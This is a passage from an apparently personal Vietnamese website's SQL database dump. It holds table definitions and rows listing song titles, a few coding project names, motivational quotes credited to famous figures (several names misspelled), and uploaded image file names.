(99, 'chery chery lady', '', '', '', '', '2024-05-07 06:09:14'),
(100, 'faded Kygo remix', '', '', '', '', '2024-05-07 09:54:38'),
(101, 'faded', '', '', '', '', '2024-05-07 09:55:01'),
(102, 'tchu tcha tcha', '', '', '', '', '2024-05-07 09:59:40'),
(103, 'chỉ là không cùng nhau', '', '', '', '', '2024-05-07 10:00:15'),
(104, 'my stupid heart', '', '', '', '', '2024-05-07 10:00:58'),
(105, 'Nothing Stopping Me', '', '', '', '', '2024-05-08 02:23:00'),
(106, 'Walk Thru Fire', '', '', '', '', '2024-05-08 02:23:40'),
(107, 'Someone To You (Lofi)', '', '', '', '', '2024-05-08 02:39:51'),
(108, 'stay(Lyrics)', 'The Kid LAROI, Justin Bieber', '', '', '', '2024-05-08 02:41:34'),
(109, 'Inuyasha 犬夜叉 - To Love\'s End', '', '', '', '', '2024-05-08 03:04:34'),
(110, 'cô độc vương', '', '', '', '', '2024-05-08 03:03:02'),
(111, 'Such a Whore (Baddest Remix)', '', '', '', '', '2024-05-08 03:06:08'),
(112, 'Remember Our Summer', '', '', '', '', '2024-05-08 03:09:17'),
(113, 'symphony', '', '', '', '', '2024-05-08 04:48:51'),
(114, 'dancin', '', '', '', '', '2024-05-08 05:31:21'),
(115, 'dancing with my ghost', '', '', '', '', '2024-05-08 05:31:46'),
(116, 'Perfect', 'Ed Sheeran', '', '', '', '2024-05-08 05:33:43'),
(117, 'yêu em rất nhiều', 'hoàng tôn', '', '', '', '2024-05-08 05:37:06'),
(118, 'light it up', '', '', '', '', '2024-05-08 05:38:02'),
(119, 'salt', '', '', '', '', '2024-05-08 05:38:20'),
(120, 'Heathens', '', '', '', '', '2024-05-08 05:39:08'),
(121, 'dadada', '', '', '', '', '2024-05-08 05:39:22'),
(122, 'Stereo Love', '', '', '', '', '2024-05-08 05:40:16'),
(123, 'my heart will go on', '', '', '', '', '2024-05-08 05:41:55'),
(124, 'we will rock you', '', '', '', '', '2024-05-08 05:42:08'),
(125, 'Kings & Queens', '', '', '', '', '2024-05-08 05:43:45'),
(126, 'sweet but Psycho', '', '', '', '', '2024-05-08 05:44:00'),
(127, 'xách balo mà đi đi đi', '', '', '', '', '2024-05-08 07:34:02'),
(128, 'yêu được không', '', '', '', '', '2024-05-10 16:19:35'),
(130, 'ngày hạnh phúc', '', '', '', '', '2024-07-08 17:07:32'),
(131, 'my love', 'Westlife', '', '', '', '2024-07-08 17:09:52'),
(132, 'safari', '', '', '', '', '2024-07-08 17:14:50'),
(133, 'twerk it like miley', '', '', '', '', '2024-07-08 17:15:35');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `music_vietnamese`
--

CREATE TABLE `music_vietnamese` (
  `id` bigint NOT NULL,
  `name_music` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `author` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_music` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `Image_music` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `status_download` varchar(25) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `times` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='nhạc việt nam';

--
-- Đang đổ dữ liệu cho bảng `music_vietnamese`
--

INSERT INTO `music_vietnamese` (`id`, `name_music`, `author`, `content_music`, `Image_music`, `status_download`, `times`) VALUES
(1, 'bán duyên', '', '', '', 'complete', '2024-05-10 17:09:11'),
(2, 'một đêm say', '', '', '', 'complete', '2024-05-10 17:09:21'),
(3, 'sai người sai thời điểm', '', '', '', 'complete', '2024-05-10 17:09:35'),
(4, 'sao mình chưa nắm tay nhau', '', '', '', 'complete', '2024-05-10 17:11:47'),
(5, 'tránh duyên', '', '', '', 'complete', '2024-05-10 17:12:41'),
(6, 'thằng hầu', '', '', '', 'complete', '2024-05-11 05:26:20'),
(7, 'tướng quân', '', '', '', '', '2024-05-11 05:26:49'),
(8, 'trót trao duyên', '', '', '', '', '2024-05-11 05:27:29'),
(9, 'chạy về nơi phía anh', '', '', '', '', '2024-05-11 05:27:58'),
(10, 'vì người không xứng đáng', '', '', '', '', '2024-05-11 05:29:58'),
(11, 'anh có muốn đưa em về không', '', '', '', 'complete', '2024-05-11 05:30:33'),
(12, 'NGÀY ĐẦU TIÊN', '', '', '', '', '2024-05-11 11:54:27'),
(13, 'em không sai, chúng ta sai', '', '', '', '', '2024-05-11 11:54:55'),
(14, 'rời bỏ', '', '', '', '', '2024-05-11 11:55:27'),
(15, 'chạm đáy nỗi đau', '', '', '', '', '2024-05-11 11:56:05'),
(16, 'vì sao', '', '', '', '', '2024-05-11 11:57:19'),
(17, 'lạc trôi', 'sơn tùng MTP', '', '', '', '2024-07-09 17:21:08');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `projects`
--

CREATE TABLE `projects` (
  `id` int NOT NULL,
  `name` varchar(255) NOT NULL,
  `description` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Đang đổ dữ liệu cho bảng `projects`
--

INSERT INTO `projects` (`id`, `name`, `description`, `created_at`) VALUES
(13, 'open sourde code', 'học qua mã nguồn mở', '2024-07-09 22:03:32'),
(14, 'computer storage management system in c++', '', '2024-07-12 13:05:25'),
(15, 'terminal library system in C', '', '2024-07-12 15:13:41'),
(16, 'Datastructure & Algorithms', '', '2024-07-18 03:31:32'),
(17, 'projectPHP', '', '2024-08-19 09:14:48');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `speak_nice`
--

CREATE TABLE `speak_nice` (
  `id` bigint NOT NULL,
  `text` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `author` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `times` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `speak_nice`
--

INSERT INTO `speak_nice` (`id`, `text`, `author`, `times`) VALUES
(1, 'giáo dục là vũ khí mạnh nhất mà người ta có thế sử dụng để thay đổi cả thế giới  ', '----n.mandela----', '2024-04-29 04:31:29'),
(2, 'Thiên Tài Là Sự Kiên Nhẫn Lâu Dài Của Trí Tuệ ', '----I.Newton----', '2024-04-29 04:31:56'),
(3, 'con người sinh ra là để lao động, cũng như con chim sinh ra là để bay ', '-Luyto-', '2024-04-29 04:58:24'),
(4, 'Không có người đàn bà nào xấu, chỉ có những người đàn bà không biết làm cho mình quyến rũ mà thôi ', '-cbristian Dior-', '2024-04-29 04:58:53'),
(5, 'Nơi ẩn náu yên ổn nhất là lòng mẹ ', '-thánh florian-', '2024-04-29 04:59:13'),
(6, 'phải có trí tuệ, dù nhỏ bé cũng được, nhưng phải là trí tuệ của mình ', '-maxim gorky-', '2024-04-29 04:59:32'),
(7, 'trang bị quý giá của con người là khiêm tốn và giản dị ', '-f.engel-', '2024-04-29 04:59:51'),
(8, 'chỉ có bản thân bạn mới đem lại cho bạn những gì bạn muốn ', '-emerson-', '2024-04-29 05:00:09'),
(9, 'Một lời xin lỗi vụng về vẫn tốt hơn là im lặng ', '-s.gosson-', '2024-04-29 05:00:27'),
(10, 'người thông minh thích học nhưng người ngu lại thích dạy ', '-cbekbov-', '2024-04-29 05:07:46'),
(11, 'phải biết mở cửa lòng mình trước mới hy vọng mở được lòng người khác ', '-pasquier quesnel-', '2024-04-29 05:08:05'),
(12, 'người nào không muốn cúi xuống vì một xu lẻ, không đáng có một đồng ', '-ngạn ngữ anh-', '2024-04-29 05:08:28'),
(13, 'những người bạn thông minh còn mãi như những cuốn sách tốt nhất của cuộc đời ', '-calderon-', '2024-04-29 05:08:57'),
(14, 'chúng ta bước đi bằng lòng tin chứ không phải bằng mắt ', '-coritbian-', '2024-04-29 06:21:02'),
(15, 'hãy giữ tình yêu mãi trong tim bạn cuộc sống không có tình yêu khác nào khu vườn không có ánh nắng ', '-khuyết danh-', '2024-04-29 06:21:25'),
(16, 'không có tình bạn, tình yêu nào như tình cha mẹ thương con ', '-h.w.beecber-', '2024-04-29 06:21:47'),
(17, 'đừng bao giờ khiêm tốn với những kẻ kiêu căng, cũng đừng bao giờ kiêu căng với người khiêm tốn ', '-jefferson-', '2024-04-29 06:22:07'),
(18, 'khiêm tốn bao nhiêu cũng chưa đủ, tự kiêu một chút cũng là nhiều ', '-k.marx-', '2024-04-29 06:22:28'),
(19, 'nóng giận là tự đem lỗi lầm của người khác để trừng phạt mình ', '-khuyết danh-', '2024-04-29 06:22:52'),
(20, 'nói là gieo, nghe là gặt ', '-pytbagore-', '2024-04-29 06:23:11'),
(21, 'đức hơn tài là người quân tử, tài hơn đức dễ hóa kẻ tiểu nhân ', '-khổng tử-', '2024-04-29 06:24:12'),
(22, 'chính sức khỏe mới là sự giàu có thực sự, không phải vàng bạc ', '-mabatma gandbi-', '2024-04-29 06:24:31'),
(23, 'đầu lưỡi tuy mêm nhưng có thể làm tổn thương người khác ', '-franklin-', '2024-04-29 06:24:49'),
(24, 'đừng thấy bóng to của mình trên tường mà tưởng mình vĩ đại ', '-pytbagore-', '2024-04-29 06:50:21'),
(25, 'chúng ta không thể thay đổi được hướng gió nhưng có thể điều khiển được cánh buồm ', '-khuyết danh-', '2024-04-29 06:50:42'),
(26, 'tự dạy mình trước rồi hãy dạy người khác ', '-w.goetbe-', '2024-04-29 06:51:01'),
(27, 'người ngốc không biết mình đang giữ trong tay những gì tốt đẹp nhất, cho đến khi tất cả đã bay xa ', '-sofocles-', '2024-04-29 06:51:19'),
(28, 'chiến thắng bản thân là chiến thắng hiển hách nhất ', '-platon-', '2024-04-29 06:51:37'),
(29, 'cuộc sống sẽ mất hết ý nghĩa nếu tuổi trẻ không biết đến công việc của những thế hệ đi trước ', '-k.paustovsky-', '2024-04-29 06:51:55'),
(30, 'đừng chạy theo tiền bạc một ngày kia nó cũng sẽ mất đi ', '-khuyết danh-', '2024-04-29 06:52:15'),
(31, 'cuộc đời là một dòng sông kẻ nào không chịu học bơi sẽ bị nước nhấn chìm ', '-m.moretti-', '2024-04-29 06:52:34'),
(32, 'dù nó thật tồi tàn đi nữa, nhưng không nơi nào có thể so sánh được với mái ấm gia đình ', '-j.h payne-', '2024-04-29 06:52:56'),
(33, 'kẻ thù lớn nhất của kiến thức không phải là sự ngu dốt mà chính là ảo tưởng và đề cao quá mức về sự hiểu biết của mình ', '- stephen hawkins -', '2024-04-29 06:55:32'),
(34, 'tình yêu là trạng thái mà khi đó hạnh phúc của một người khác trở nên cực kỳ quan trọng đối với hạnh phúc của bạn ', '- robert A heinlein -', '2024-04-29 06:55:59'),
(35, 'một bước hành động thực tế quan trọng hơn cương lĩnh ', '- Marx -', '2024-04-29 14:58:38'),
(36, 'người cao thượng là người không bao giờ làm một điều gì để hạ thấp người khác ', '- A. Ca-sơn -', '2024-04-29 14:59:00'),
(37, 'người luôn khen ngợi bạn là kẻ thù lớn nhất của bạn ', '- ngạn ngữ anh -', '2024-04-29 14:59:21'),
(38, 'người ta giàu vì biết lao động, giàu hơn nữa vì biết tiết kiệm chi tiêu ', '-ngạn ngữ thổ nhĩ kỳ-', '2024-04-29 14:59:44'),
(39, 'cố gắng là tất cả những gì mà bạn phải làm, dù thành công hay thất bại ', '-robert thibodaux-', '2024-04-29 15:00:12'),
(40, 'thành đạt không phải ở người giúp đỡ mà chính do lòng tự tin ', '-abraham lincohn-', '2024-04-29 15:00:33'),
(41, 'học tập là hạt giống của kiến thức, kiến thức là hạt giống của hạnh phúc ', '-ngạn ngữ Gruzia-', '2024-04-29 15:00:54'),
(42, 'sách hay, cũng như bạn tốt, ít và được chọn lựa; chọn lựa càng nhiều, thưởng thức càng nhiều ', '-louisa may alcott-', '2024-04-29 15:01:43'),
(43, 'đừng bao giờ nói không thể bởi chưa ai từng nhìn thấy giới hạn của tiềm năng ', '-william james-', '2024-04-29 15:02:01'),
(44, 'những ai cố gắng và liên tục cố gắng sẽ đạt được và duy trì được thành công ', '-w.clement stone-', '2024-04-29 15:02:20'),
(45, 'cách tốt nhất để cổ vũ bản thân là cố gắng cổ vũ người khác ', '-mark twain-', '2024-04-29 15:02:39'),
(46, 'người có ý chí vượt qua tất cả sự nặng nhọc có thể đạt được bất cứ mục tiêu nào ', '-Menander-', '2024-04-29 15:03:01'),
(47, 'trở ngại là những thứ đáng sợ bạn thấy khi rời mắt khỏi mục tiêu ', '-henry Ford-', '2024-04-29 18:57:18'),
(48, 'tất cả những sự khó khăn thường là để chuẩn bị cho những người bình thường một số phận phi thường ', '-c.s.lewis-', '2024-04-29 18:57:46'),
(49, 'một tia nắng duy nhất cũng đủ để xua đuổi nhiều bóng tối ', '-francis of Assisi-', '2024-04-29 18:58:09'),
(50, 'lý tưởng ấp ủ trong tâm trí sẽ tạo nên những hành vi phù hợp với lý tưởng ', '-e.hubbart-', '2024-04-29 18:58:32'),
(51, 'vinh quang nằm trong nỗ lực, không phải kết quả, nỗ lực hết mình là thắng lợi hoàn toàn ', '-Mahatma Gandhi-', '2024-04-29 18:58:56'),
(52, 'cha đẻ của hạnh phúc và thành công là sự kiên nhẫn làm việc ', '-euripide-', '2024-04-29 18:59:21'),
(53, 'không bao giờ là quá già để lập thêm một mục tiêu mới hay mơ thêm một giấc mơ mới ', '-c.s.lewis-', '2024-04-29 18:59:42'),
(54, 'đừng buộc người khác chịu cái điều mà ngay chính bạn cũng không chịu nổi ', '-p.syrus-', '2024-04-29 19:00:05'),
(55, 'bóng đen tâm hồn phải dùng kiến thức để đuổi ', '-lucretius-', '2024-04-29 19:00:30'),
(56, 'hiền dữ đâu phải do tính sẵn, phần nhiều do giáo dục mà nên ', '-Hồ Chí Minh-', '2024-04-29 19:00:58'),
(57, 'người hạnh phúc là người lắng nghe, kẻ bất hạnh là kẻ thổ lộ ', '-ralph waldo emerson-', '2024-04-29 19:01:16'),
(58, 'thà làm sư tử chỉ một ngày còn hơn làm cừu cả một đời ', '-elizabeth kenny-', '2024-04-29 19:01:36'),
(59, 'những gì chúng ta sợ làm nhất là những gì chúng ta cần làm nhất ', '-tim Ferriss-', '2024-04-29 19:02:05'),
(60, 'quá khứ là kinh nghiệm, hiện tại là đấu tranh, tương lai là của mình ', '-j.stalin-', '2024-04-29 19:02:24'),
(61, 'nếu bạn sinh ra nghèo, đó không phải là lỗi của bạn, nhưng nếu bạn chết trong nghèo đó là lỗi của bạn', '-bill Gates-', '2024-04-29 19:02:47'),
(62, 'bạn là người hiểu được quá khứ của ta, tin vào tương lai ta và chấp nhận ta như chính bản thân ta ', '-khuyết danh-', '2024-04-29 19:03:10'),
(63, 'thời gian mà bạn hưởng thụ để phung phí, không lãng phí ', '-john Lennon-', '2024-04-29 19:03:33'),
(64, 'khi chưa bắt tay vào công việc, sự lo lắng chỉ làm cho con người ta mệt mỏi ', '-khuyết danh-', '2024-04-29 19:03:53'),
(65, 'trên đời này làm gì có đường, người ta đi mãi thì thành đường thôi ', '-lỗ tấn-', '2024-04-29 19:04:14'),
(66, 'một giờ làm việc cường độ cao đáng giá bằng cả một ngày mơ mộng ', '-mary kay Ash-', '2024-04-29 19:04:34'),
(67, 'sức khỏe là vương miện trên đầu những người bình thường mà chỉ người bệnh mới có thể nhìn thấy ', '-Robin Sharma-', '2024-04-29 19:04:54'),
(68, 'hạnh phúc cũng giống như chiếc đồng hồ, loại ít phức tạp nhất là loại ít hỏng nhất ', '-khuyết danh-', '2024-04-29 19:05:15'),
(69, 'không cần biết bạn làm việc chăm chỉ như thế nào, người khác đang làm việc chăm chỉ hơn ', '-elon musk-', '2024-04-29 19:05:35'),
(70, 'bạn có thể tin vào những giấc mơ của mình, nhưng bạn phải hành động để biến những giấc mơ ấy thành hiện thực, đường bao giờ từ bỏ khát vọng ', '-nick vujicic-', '2024-04-29 19:05:53'),
(71, 'từ những cay đắng của bệnh tật người ta mới học được sự ngọt ngào của sức khỏe ', '-catalan proverb-', '2024-04-29 19:06:17');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `tbl_image`
--

CREATE TABLE `tbl_image` (
  `tbl_image_id` int NOT NULL,
  `tbl_image_folder_id` int NOT NULL,
  `image_name` text NOT NULL,
  `data_uploaded` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Đang đổ dữ liệu cho bảng `tbl_image`
--

INSERT INTO `tbl_image` (`tbl_image_id`, `tbl_image_folder_id`, `image_name`, `data_uploaded`) VALUES
(7, 4, 'ed098bfbd6c604d6_66a4d424bc97c3.95693818.png', '2024-07-27 04:04:04'),
(8, 4, '1f0d88271ee9b854_66a4d4882df030.56010028.png', '2024-07-27 04:05:44'),
(9, 4, '2653e39a4d534276_66a4d4ad354a97.48642247.png', '2024-07-27 04:06:21'),
(10, 4, '42e6c8852fd78dc9_66a4d4d61525a7.01414363.png', '2024-07-27 04:07:02'),
(11, 4, '080e4e36eadbf9b2_66a4d50a4adad5.27207252.png', '2024-07-27 04:07:54'),
(12, 4, '0bd2ecbcbaf1762d_66a4d51dd83dd0.50520898.png', '2024-07-27 04:08:13'),
(13, 4, '9f4289180d850987_66a4d52bac0035.07310736.png', '2024-07-27 04:08:27'),
(14, 4, '8c1a5424c849d296_66a4d53b3801b2.26869390.png', '2024-07-27 04:08:43'),
(15, 4, 'b83d28750417eac9_66a4d558678894.00157539.png', '2024-07-27 04:09:12'),
(16, 4, '9a5faa130f661476_66a4d56aea6859.72071894.png', '2024-07-27 04:09:30'),
(17, 4, 'ab550dfd2a9fb261_66a4d57b98da67.77376646.png', '2024-07-27 04:09:47'),
(18, 4, 'b5b01e980b5a7eb7_66a4d5910ef811.52669249.png', '2024-07-27 04:10:09'),
(19, 4, '57d3ea913b533859_66a4d5abb22ee0.86270944.png', '2024-07-27 04:10:35'),
(20, 4, '389dc7575fd26259_66a4d6cee94675.26395772.png', '2024-07-27 04:15:26'),
(21, 4, '3d2f4fc12bfed99c_66a4d6e0973f10.74114822.png', '2024-07-27 04:15:44'),
(22, 4, '1b5378874e2ca072_66a4d71a05ced7.90197596.png', '2024-07-27 04:16:42'),
(23, 4, 'f1639d82e223ae0e_66a4d727390488.02872180.png', '2024-07-27 04:16:55'),
(24, 4, '5a46700819ccef54_66a4d7462c05a0.71126227.png', '2024-07-27 04:17:26'),
(25, 4, '5b899176275c7fb9_66a4d75392bfa8.49695034.png', '2024-07-27 04:17:39'),
(26, 4, '1722c0402c5cdeeb_66a4d792050ac4.02882556.png', '2024-07-27 04:18:42'),
(27, 4, '586040f2f74dd561_66a4d7a37ede54.58553702.png', '2024-07-27 04:18:59'),
(28, 4, 'c67cf4211ab3b7e7_66a4d828f1e175.91901945.png', '2024-07-27 04:21:12'),
(29, 4, '9c4af25231f6979a_66a4d85a019936.93693759.png', '2024-07-27 04:22:02'),
(30, 4, '2067d3df623fe8c8_66a4d9085f9611.39869385.png', '2024-07-27 04:24:56'),
(31, 4, 'a9d1d3b75906e657_66a4d917400e48.55642498.png', '2024-07-27 04:25:11'),
(32, 4, '99f7e4fe2a9a0367_66a4d92b5e9c37.84087457.png', '2024-07-27 04:25:31'),
(33, 4, '63ed717a553f7329_66a4d93b84ad79.69932017.png', '2024-07-27 04:25:47'),
(34, 4, '6875b3638849b88a_66a4d94c040052.41482508.png', '2024-07-27 04:26:04'),
(35, 4, 'd173766bec0c908e_66a4d95b081e08.44331443.png', '2024-07-27 04:26:19'),
(36, 4, '43460e39d25a107c_66a4d968a588d8.38797853.png', '2024-07-27 04:26:32'),
(37, 4, 'ff76bda31c8d509d_66a4d98588e291.84915466.png', '2024-07-27 04:27:01'),
(38, 4, '02847a78f70e2897_66a4d9a6b25d25.32526651.png', '2024-07-27 04:27:34'),
(39, 4, '07cc2a8651799e38_66a4d9b4777951.15442884.png', '2024-07-27 04:27:48'),
(40, 4, '48685f129e014886_66a4d9c0972329.42426230.png', '2024-07-27 04:28:00'),
(41, 4, '1b6668e38ee22a73_66a4d9cc1f2e50.45621245.png', '2024-07-27 04:28:12'),
(42, 4, '14064d01f214396c_66a4d9d826ac50.27626530.png', '2024-07-27 04:28:24'),
(43, 4, '49f664ffb37cea63_66a4d9fbc3e8c7.84943667.png', '2024-07-27 04:28:59'),
(44, 4, '18a7d3f00df2444b_66a4da087dc635.32841399.png', '2024-07-27 04:29:12'),
(45, 4, '453f7200f7b44aed_66a4da142f52f3.29906759.png', '2024-07-27 04:29:24'),
(46, 4, 'd51fbe11f672f854_66a4da209d9af3.94609931.png', '2024-07-27 04:29:36'),
(47, 4, '04a69f19f7289fa9_66a4da394e5c20.38653765.png', '2024-07-27 04:30:01'),
(48, 4, '314e887694def362_66a4da45f39373.42829198.png', '2024-07-27 04:30:13'),
(49, 6, 'fec72cdb6592e549_66a4e9b775f341.24112710.png', '2024-07-27 05:36:07'),
(50, 6, '9f20f942c1fd8519_66a4e9d7821dd4.48807102.png', '2024-07-27 05:36:39'),
(51, 6, 'f01025e52f19f7bc_66a4e9eada4717.78844650.png', '2024-07-27 05:36:58'),
(52, 6, 'd3502cf64f7e832d_66a4e9fc03ac48.16643939.png', '2024-07-27 05:37:16'),
(53, 6, 'b4bb689af3955907_66a4ea11eb2e31.97550635.png', '2024-07-27 05:37:37'),
(54, 6, '5d23b6d732a7d20f_66a4ea27cb80e5.47140480.png', '2024-07-27 05:37:59'),
(55, 6, '04468bf1714ec288_66a4eb05047190.08719565.png', '2024-07-27 05:41:41'),
(56, 6, '8d0ac4efe8651f85_66a4eb1c80cba6.94043854.png', '2024-07-27 05:42:04'),
(57, 6, '20058d0cf4a0c7b7_66a4ecef04f046.71287291.png', '2024-07-27 05:49:51'),
(58, 6, '0b7d1208a2d88174_66a4ecffe645c1.84094935.png', '2024-07-27 05:50:07'),
(59, 6, '6d4c4b98a623f9fb_66a4eea56db193.18347713.png', '2024-07-27 05:57:09'),
(60, 6, '2e2aca956eef1b0c_66a4eeb516c0f4.01231278.png', '2024-07-27 05:57:25'),
(61, 6, 'e6f373e63a8be6d4_66a4ef30502381.33832219.png', '2024-07-27 05:59:28'),
(62, 6, '432eef25ffb101e3_66a4ef427c5680.70680492.png', '2024-07-27 05:59:46'),
(63, 6, 'd0ceceb9b5645b59_66a4ef50052455.07120552.png', '2024-07-27 06:00:00'),
(64, 6, 'bbb757a79eaf5d30_66a4ef60799531.43074692.png', '2024-07-27 06:00:16'),
(65, 6, 'f259128c79315a9c_66a4ef6e1df9e1.80040228.png', '2024-07-27 06:00:30'),
(66, 6, 'd40fdf4e496fe96d_66a4efd8aade66.91854947.png', '2024-07-27 06:02:16'),
(67, 6, 'b0dc8d3ee5ed5a2c_66a4efe7732ab5.07798539.png', '2024-07-27 06:02:31'),
(68, 6, 'aefb296bbd704157_66a4eff6a5ea94.22311722.png', '2024-07-27 06:02:46'),
(69, 6, '2e9e79c859f7913b_66a4f04a3aedd6.45229995.png', '2024-07-27 06:04:10'),
(70, 6, '3611defffbf3de1d_66a4f058311d39.60531661.png', '2024-07-27 06:04:24'),
(71, 6, '9862c56405519e2a_66a4f076883538.67102468.png', '2024-07-27 06:04:54'),
(72, 6, '2970c0203b824ce1_66a4f089f1f2b9.75205270.png', '2024-07-27 06:05:13'),
(73, 6, 'debb1c8c70c8568e_66a4f098696e59.07007953.png', '2024-07-27 06:05:28'),
(74, 6, '3d48122f697a61de_66a4f0aa650b12.34023854.png', '2024-07-27 06:05:46'),
(75, 6, '9fe2c2ed7d5acccb_66a4f0b7efa913.19687806.png', '2024-07-27 06:05:59'),
(76, 6, 'c91121b3166a4896_66a4f0c76d0464.64518096.png', '2024-07-27 06:06:15'),
(77, 6, '17de0e1f339b2055_66a4f0ddc95ee8.04641770.png', '2024-07-27 06:06:37'),
(78, 6, '8092d404d03a6d75_66a4f0ecbed656.04370272.png', '2024-07-27 06:06:52'),
(79, 6, 'a6a631acd209d48e_66a4f1017332d5.66086127.png', '2024-07-27 06:07:13'),
(80, 6, '9b4a9062dcff0fe5_66a4f10f8dc347.07009146.png', '2024-07-27 06:07:27'),
(81, 6, 'fb5cc190d6df0d57_66a4f11dbeca05.83358565.png', '2024-07-27 06:07:41'),
(82, 6, '498a8dfc3a7c5e38_66a4f12c6f6774.27796578.png', '2024-07-27 06:07:56'),
(83, 6, '42a33876d3df690c_66a4f1d2c01899.87053555.png', '2024-07-27 06:10:42'),
(84, 6, '7d385a22591f7fed_66a4f1e10f4b13.24835668.png', '2024-07-27 06:10:57'),
(85, 6, '433869590901c884_66a4f1f01cee74.18863144.png', '2024-07-27 06:11:12'),
(86, 6, 'f9d823001cbcb5d1_66a4f2530d3917.18170973.png', '2024-07-27 06:12:51'),
(87, 6, 'b0d5781b1aac20d1_66a4f260896f61.49260613.png', '2024-07-27 06:13:04'),
(88, 6, '987fb694fc7bacad_66a4f26f104cc1.29249875.png', '2024-07-27 06:13:19'),
(89, 6, 'be12f75ada819dfd_66a4f27cc37253.18725016.png', '2024-07-27 06:13:32'),
(90, 6, 'cc041ce669389df3_66a4f28b3511e0.67569499.png', '2024-07-27 06:13:47'),
(91, 6, 'dd1bf8668a2d15b5_66a4f299cfd0b5.51159953.png', '2024-07-27 06:14:01'),
(92, 6, 'b3ed829103627699_66a4f2a86a74d1.86831468.png', '2024-07-27 06:14:16'),
(93, 6, '33674104c9d85c2e_66a4f334dc3bf2.09936944.png', '2024-07-27 06:16:36'),
(94, 6, 'f0f4138545298a35_66a4f343708700.67006651.png', '2024-07-27 06:16:51'),
(95, 6, '1e3859d2fb74e422_66a4f4cc38fa16.21373065.png', '2024-07-27 06:23:24'),
(96, 6, '0142938e93773de9_66a4f4db052e76.23723288.png', '2024-07-27 06:23:39'),
(97, 6, 'c85dbf6c451cd606_66a4f4ecdd7ee8.73027236.png', '2024-07-27 06:23:56'),
(98, 6, 'a80fb9b81d9d4bb6_66a4f4fa470c34.17305136.png', '2024-07-27 06:24:10'),
(99, 6, 'b587c19cc2d0cdec_66a4f5079f5e82.14557532.png', '2024-07-27 06:24:23'),
(100, 6, '40d31cab9b0ce19a_66a4f5182b2512.15545337.png', '2024-07-27 06:24:40'),
(101, 6, '6892af43fec9c025_66a4f52fc25a81.91095538.png', '2024-07-27 06:25:03'),
(102, 6, 'ca2b70b768b1c983_66a4f53d362909.70172856.png', '2024-07-27 06:25:17'),
(103, 6, '5d03266ad9ea5d03_66a4f5c9c9e020.59128266.png', '2024-07-27 06:27:37'),
(104, 6, 'fc0999d0cb1f0489_66a4f5d8369d95.45736336.png', '2024-07-27 06:27:52'),
(105, 6, 'a22f8894b4dc2d71_66a4f5e5e27011.97895052.png', '2024-07-27 06:28:05'),
(106, 6, '1e6549398204d2c4_66a4f5f2957773.60093643.png', '2024-07-27 06:28:18'),
(107, 6, '58ee727f536d0b53_66a4f5ffd520d9.08633479.png', '2024-07-27 06:28:31'),
(108, 6, 'e46e939a9790ef1a_66a4f864af4ca1.46923513.png', '2024-07-27 06:38:44'),
(109, 6, '6937ccd8bbbba5bd_66a4f872602500.76643088.png', '2024-07-27 06:38:58'),
(110, 6, '97827daaa9215721_66a4f886088737.65069007.png', '2024-07-27 06:39:18'),
(111, 6, '02b8643d57e3a1dd_66a4f898510ca9.66514890.png', '2024-07-27 06:39:36'),
(112, 6, '83a7f057218693bb_66a4f8a553eaa9.85985031.png', '2024-07-27 06:39:49'),
(113, 6, '0cd5595cfab74bd2_66a4f8b2950b17.58384622.png', '2024-07-27 06:40:02'),
(114, 6, '7b1cbeb7c0eceeb6_66a4f8bf51d698.87472759.png', '2024-07-27 06:40:15'),
(115, 6, 'ace4d71d3f276b67_66a4f8cdbb0527.99929151.png', '2024-07-27 06:40:29'),
(116, 6, '77d8d780eff51b99_66a4f8e0125493.74083884.png', '2024-07-27 06:40:48'),
(117, 6, '784369ded8cb7f67_66a4f8ed52f809.88193443.png', '2024-07-27 06:41:01'),
(118, 6, '0263b53399af6b21_66a4f8f9a91434.68427612.png', '2024-07-27 06:41:13'),
(119, 6, 'c18edd74a48a713f_66a4f9090e43a9.15630311.png', '2024-07-27 06:41:29'),
(120, 6, 'e04eefdb331cacca_66a4f91b5b2e16.95956000.png', '2024-07-27 06:41:47'),
(121, 6, '0cd50bee83c6d023_66a4f92fb742f3.87314581.png', '2024-07-27 06:42:07'),
(122, 6, '76780148591cfb24_66a4f93ef3c6f5.19868114.png', '2024-07-27 06:42:22'),
(123, 6, '1a81b6a42a2e5f33_66a4f94bb86288.39209158.png', '2024-07-27 06:42:35'),
(124, 6, 'dcd78a6855d0247a_66a4f959603242.94493781.png', '2024-07-27 06:42:49'),
(125, 6, 'c91cbaa3ff5233bd_66a4f966bf9921.52262288.png', '2024-07-27 06:43:02'),
(126, 6, '764e68a9fcb18a64_66a4f97fec6231.59725388.png', '2024-07-27 06:43:27'),
(127, 6, 'ed551c8020b3f1e5_66a4f98d2ab866.85021325.png', '2024-07-27 06:43:41'),
(128, 6, '6d4d1026aff7a1fb_66a4f99d37e249.98524267.png', '2024-07-27 06:43:57'),
(129, 6, 'de3dc475ff0afc77_66a4f9ac6cd4b2.87215080.png', '2024-07-27 06:44:12'),
